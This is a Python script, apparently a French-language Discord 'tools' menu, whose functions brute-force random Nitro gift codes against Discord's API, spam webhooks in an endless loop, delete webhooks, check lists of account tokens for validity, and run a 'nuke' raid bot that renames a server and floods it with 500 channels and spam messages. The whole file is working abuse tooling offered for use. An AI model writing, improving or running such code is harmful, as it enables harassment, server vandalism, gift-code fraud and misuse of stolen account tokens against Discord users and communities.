#!/usr/bin/python3
# -*- coding: utf-8 -*-

import colorama
from colorama import Fore
from colorama import Style
from colorama.initialise import reset_all

colorama.init()

def main():
    print(Fore.RED +"""

 _____           _      ______ _                       _ 
|_   _|         | |     |  _  (_)                     | |
  | | ___   ___ | |___  | | | |_ ___  ___ ___  _ __ __| |
  | |/ _ \ / _ \| / __| | | | | / __|/ __/ _ \| '__/ _` |
  | | (_) | (_) | \__ \ | |/ /| \__ \ (_| (_) | | | (_| |
  \_/\___/ \___/|_|___/ |___/ |_|___/\___\___/|_|  \__,_|     BETA


""" + Style.RESET_ALL)
    print(Fore.MAGENTA +"\n\nCreate by Zerfox | My github is https://github.com/pommepoirechocolat  | BETA\n\n" + Style.RESET_ALL)

    n = input("""           [1] Gen        [2] Webhook        [3] token     [4]Raid\n\nChoisie un nombre:  """)
    if n == '1':
        Generateur()

    if n == '2':
        weebhook()

    if n == '3':
        bot()

    if n == '4':
        Raid()


def Generateur():
    print(Fore.MAGENTA + """





                                                                   
  ,----..                         
 /   /   \                        
|   :     :                ,---,  
.   |  ;. /            ,-+-. /  | 
.   ; /--`     ,---.  ,--.'|'   | 
;   | ;  __   /     \|   |  ,"' | 
|   : |.' .' /    /  |   | /  | | 
.   | '_.' :.    ' / |   | |  | | 
'   ; : \  |'   ;   /|   | |  |/  
'   | '/  .''   |  / |   | |--'   
|   :    /  |   :    |   |/       
 \   \ .'    \   \  /'---'        
  `---`       `----'              
                                  
    
    
    
    
    """ + Style.RESET_ALL)
    f = input("[1]Nitro  [2]Proxie  [3]Compte [m]menu \nChoisie un nombre ")

    if f == '1':
        Nitro()

    if f == 'm':
        main()

    if f == '2':
        proxiegen()

    if f == '3':
        compte()




def Nitro():
    print(Fore.YELLOW +""" 







              _   _ _ _               _____            
             | \ | (_) |             |  __ \           
             |  \| |_| |_ _ __ ___   | |  \/ ___ _ __  
             | . ` | | __| '__/ _ \  | | __ / _ \ '_ \ 
             | |\  | | |_| | | (_) | | |_\ \  __/ | | |
             \_| \_/_|\__|_|  \___/   \____/\___|_| |_|
             
             
             
             
             
             """ + Style.RESET_ALL)  
    
    v = input("[1] Gen + Checker [m] menu\n\nChoisie 1 pour générer des code nitro:  ")

    if v == '1':
        Gen()

    if v == 'm':
        Generateur()

def Gen():
    import random, string
    import webbrowser
    import time
    import requests
    num=input('\nCombien de Code: ')
    f=open("Nitro Codes.txt","w", encoding='utf-8')
    print("\nGénération des code en cour...")
    
    for n in range(int(num)):
        y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
        
        f.write('https://discord.gift/')
        f.write(y)
        f.write("\n")
    f.close()  
    with open("Nitro Codes.txt") as f:
        for line in f:
            nitro = line.strip("\n")
            
            url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
            r = requests.get(url)
            
            if r.status_code == 200:
                print(Fore.GREEN + " Valid | {} ".format(line.strip("\n" + Style.RESET_ALL)))
                break
            else:
                print(Fore.RED + " Invalid | {} ".format(line.strip("\n" + Style.RESET_ALL)))


def compte():
    print ("en cours de dévelopement...")
    q = input (" [m] menu ")

    if q == 'm':
        main()


def proxiegen():
    print(Fore.RED + """

 ▄▀▀▄▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄  ▄▀▄  ▄▀▀▄ ▀▀▄ 
█   █   █ █   █   █ █      █ █    █   █ █   ▀▄ ▄▀ 
▐  █▀▀▀▀  ▐  █▀▀█▀  █      █ ▐     ▀▄▀  ▐     █   
   █       ▄▀    █  ▀▄    ▄▀      ▄▀ █        █   
 ▄▀       █     █     ▀▀▀▀       █  ▄▀      ▄▀    
█         ▐     ▐              ▄▀  ▄▀       █     
▐                             █    ▐        ▐     
""" + Style.RESET_ALL)

    w = input ("[1]Gen   [2]Checkeur  [m] Menu \n\n Choisie un nombre:  ")

    if w == '1':    
        popop()

    if w == 'm':
        main()
    
    if w == '2':
        pouloulou()


def popop():
    from bs4 import BeautifulSoup as bs
    import random as rn
    import os
    import requests as rq

    print("Vos proxie vont apparaitre dans quelque seconde!")

    n = "\033[m"
    r = "\033[1;31m"
    g = "\033[1;32m"
    y = "\033[1;33m"
    w = "\033[1;37m"
    b = "\033[1;34m"
    p = "\033[1;35m"
    cy = "\033[1;36m"

    colors = [r,g,y,w,b,p,cy]

    headers = {'User-Agent' : 'Mozilla/5.0'}

    r = rq.get("https://www.us-proxy.org/",headers=headers).text

    s = bs(r,"html.parser")
    hosts = s.find("textarea",{"class":"form-control"})

    list = (hosts.text).split("\n")
    for host in list:
        color = rn.choice(colors)
        if host == "":
            continue
        else:
            print(color+host+n)


def pouloulou():
    print ("en couur de travail")

    g = input ("[m] menu  \n retourne au menu:  ")

    if g == 'm':
        main()









        



def weebhook():
    print(Fore.MAGENTA + """






     ____      ____      __       __                     __              
    |_  _|    |_  _|    [  |     [  |                   [  |  _          
      \ \  /\  / /.---.  | |.--.  | |--.   .--.    .--.  | | / ]  .--.   
       \ \/  \/ // /__\\ | '/'`\ \| .-. |/ .'`\ \/ .'`\ \| '' <  ( (`\]  
        \  /\  / | \__., |  \__/ || | | || \__. || \__. || |`\ \  `'.'.  
         \/  \/   '.__.'[__;.__.'[___]|__]'.__.'  '.__.'[__|  \_][\__) ) 
         
         
         
         
         
         
         """ + Style.RESET_ALL)
    
    l = input("\n[1]spam    [2]suprimé  [3]evoyer un message  [m]menu \nchoisir un nombre:  ")

    if l == '1':
        Spam()

    if l == '2':
        deleted()


    if l == '3':
        message()

    if l == 'm':
        main()


def Spam():
    import discord_webhook
    from discord_webhook import DiscordEmbed, DiscordWebhook
    import string
    import time
    import requests
    import colorama
    import json
    from colorama import Fore

    colorama.init()

    def webhkspammer():
        webhook = input("\n[>] url du webhook:  ")
        message = input("\n[>] Que veux tu spam:  ")
        delay = float(input("\n[>] l'interval entre chaque message (exemple: 0.5):  "))

        while True:
            print(Fore.BLUE + "Envoie ---> " + message)
            print(Fore.RESET + " ")
            try:
                time.sleep(delay)
                _data = requests.post(webhook, json={'content': message})

                if _data.status_code == 204:
                    print(Fore.YELLOW + "envoyé --> " + message)
            except:
                print("Quelque chose est arrivé ! Webhook probablement cassé" + weebhook)
                time.sleep(5)
                exit()
    x = 5
    while x == 5:
        webhkspammer()

def deleted():
    import colorama
    import requests
    import ctypes
    import datetime
    import os
    import time
    from datetime import date
    from colorama import Fore, Back, Style

    colorama.init()

    count = 0
    today = date.today()
    d2 = today.strftime("%B %d, %Y")

    ctypes.windll.kernel32.SetConsoleTitleW(f'Webhook Deleter | {d2}')

    p = f'{Style.BRIGHT + Fore.MAGENTA}'
    w = f'{Style.BRIGHT + Fore.WHITE}'

    webhook = input("Webhook url : ")
    requests.delete(webhook).text   
    print(f"\n{w}le {p}Webhook {w}à bien etai suprimé{p}\n")
    time.sleep(1.5)



def message():
    from discord_webhook import DiscordWebhook
    url = input("[>] url du webhook:  ")
    message = input("\n [>] quel est le message a envoyer:  ")
    webhook_url = [url]
    webhook = DiscordWebhook(url=webhook_url, content= message)
    response = webhook.execute()
    print(Fore.RED + "\n [...]message ben envoyer" + Style.RESET_ALL)





def bot():
    print(Fore.YELLOW + """





                                                                                           
 _________________       _____     ____    ____       ______  _____   ______   
/                 \ ____|\    \   |    |  |    |  ___|\     \|\    \ |\     \  
\______     ______//     /\    \  |    |  |    | |     \     \\\    \| \     \ 
   \( /    /  )/  /     /  \    \ |    | /    // |     ,_____/|\|    \  \     |
    ' |   |   '  |     |    |    ||    |/ _ _//  |     \--'\_|/ |     \  |    |
      |   |      |     |    |    ||    |\    \'  |     /___/|   |      \ |    |
     /   //      |\     \  /    /||    | \    \  |     \____|\  |    |\ \|    |
    /___//       | \_____\/____/ ||____|  \____\ |____ '     /| |____||\_____/|
   |`   |         \ |    ||    | /|    |   |    ||    /_____/ | |    |/ \|   ||
   |____|          \|____||____|/ |____|   |____||____|     | / |____|   |___|/
     \(               \(    )/      \(       )/    \( |_____|/    \(       )/  
      '                '    '        '       '      '    )/        '       '   
                                                         '                     
                                                                                           
                                                                                           
                                                                                           
                                                                                                                                                                                                                
    """ + Style.RESET_ALL)

    p = input ("[1]Token Check     [m] Menu\nVeuiller entré un nombre: ")

    if p == '1':
        checkeur()


    if p == 'm':
        main()



def checkeur():
    import requests
    print(Fore.RED + "Merci de metre dans le fichier lol un fichier texte nommé tokens.txt " + Style.RESET_ALL)
    with open("tokens.txt") as f:
        for line in f:
            token = line.strip("\n")
            headers = {'Content-Type': 'application/json', 'authorization': token}
            url = "https://discordapp.com/api/v6/users/@me/library"
            r = requests.get(url, headers=headers)
            if r.status_code == 200:
                print("{} Fonctionel :)".format(line.strip("\n")))
            else:
                print("Token non fonctionel")
    y = input (Fore.RED + "Pour revenir au menu metez un m:  " + Style.RESET_ALL)

    if y == 'm':
        main()







def Raid():
    print(Fore.RED + """
     ██▀███   ▄▄▄       ██▓▓█████▄ 
▓██ ▒ ██▒▒████▄    ▓██▒▒██▀ ██▌
▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒░██   █▌
▒██▀▀█▄  ░██▄▄▄▄██ ░██░░▓█▄   ▌
░██▓ ▒██▒ ▓█   ▓██▒░██░░▒████▓ 
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▓   ▒▒▓  ▒ 
  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒ ░ ░ ▒  ▒ 
  ░░   ░   ░   ▒    ▒ ░ ░ ░  ░ 
   ░           ░  ░ ░     ░    
                        ░      """ + Style.RESET_ALL)
    h = input ("[1] RAID BOT   [m] menu \n choisie un nombre:  ")

    if h == '1':
        RaidBot()

    if h == 'm':
        main()



def RaidBot():
    import discord,os,asyncio
    from discord.ext import commands, tasks
    
    tokenraid = input ("\n\nToken du Bot:")
    prefix = input ("choisi le péfix:  ")
    nameserveur = input ("Quel nom pour le serveur:  ")
    channelname = input ("Nom des channel créé:  ")
    messagesend = input ("message a spam:  ")
    messagesend2 = input ("autre message a spam:  ")
    print ("Le Raid va commencer !")
    prefix= prefix
    
    client = commands.Bot(command_prefix=prefix)

    @client.event
    async def on_ready():
        print(Fore.GREEN + "Bot opérationelle ")
        await client.change_presence(activity=discord.Game(name="Bot create by Zerfox | my github: https://github.com/pommepoirechocolat"))

    with open ('logo.png','rb') as f:
        icon = f.read()

    @client.command()
    async def  nuke(ctx):
        
        await ctx.guild.edit(name=nameserveur, icon=icon) 
        guild = ctx.message.guild 
            
        n = 0
        while(n<=500):
            await guild.create_text_channel(channelname)
            await ctx.channel.send(messagesend)
            await ctx.channel.send(messagesend2)
            n = n + 1
    
    TOKEN = tokenraid
    client.run(TOKEN)


if __name__ == "__main__":
    main()